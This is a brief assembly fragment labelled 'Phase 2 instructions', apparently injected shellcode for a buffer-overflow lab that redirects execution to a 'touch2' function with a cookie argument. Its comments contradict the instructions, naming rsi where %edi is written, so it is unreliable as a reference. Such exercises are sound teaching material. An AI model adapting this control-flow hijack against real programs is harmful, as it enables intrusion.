# Phase 2 instructions
	ret /* addr of mov below */
	lea 0x1b(%rip),%edi # Move addr of cookie to rsi
	sub $0x40,%rsp  # Point rsp to addr of touch2
	ret	


